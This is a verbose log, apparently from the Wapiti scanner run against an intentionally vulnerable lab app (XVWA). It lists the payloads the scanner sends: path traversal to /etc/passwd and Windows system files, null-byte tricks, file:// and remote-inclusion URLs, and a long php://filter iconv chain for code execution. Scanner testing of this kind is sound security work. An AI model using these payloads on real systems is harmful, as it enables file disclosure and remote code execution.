+2024-03-20 15:24:45.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.448 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.475 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.491 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.502 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.514 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.526 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.540 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.553 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.567 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.596 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.609 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.626 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.641 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.655 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.669 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.695 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=file%3A%2F%2F%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.709 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&search=
+2024-03-20 15:24:45.723 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.753 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.769 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.782 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.814 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 15:24:45.824 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 15:24:45.836 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2Fetc%2Fpasswd
+2024-03-20 15:24:45.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2Fetc%2Fpasswd%00
+2024-03-20 15:24:45.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2Fetc%2Fservices
+2024-03-20 15:24:45.873 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2Fetc%2Fservices%00
+2024-03-20 15:24:45.886 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:45.898 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 15:24:45.912 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 15:24:45.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:45.936 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:45.948 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 15:24:45.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 15:24:45.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 15:24:45.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:45.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:46.010 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.032 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:46.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:46.051 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:46.060 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:46.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.082 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.097 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.110 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.125 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 15:24:46.137 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:46.148 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:46.159 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.171 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.181 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:46.191 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:46.201 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:46.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:46.223 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.236 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.262 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.273 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:46.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:46.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.308 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
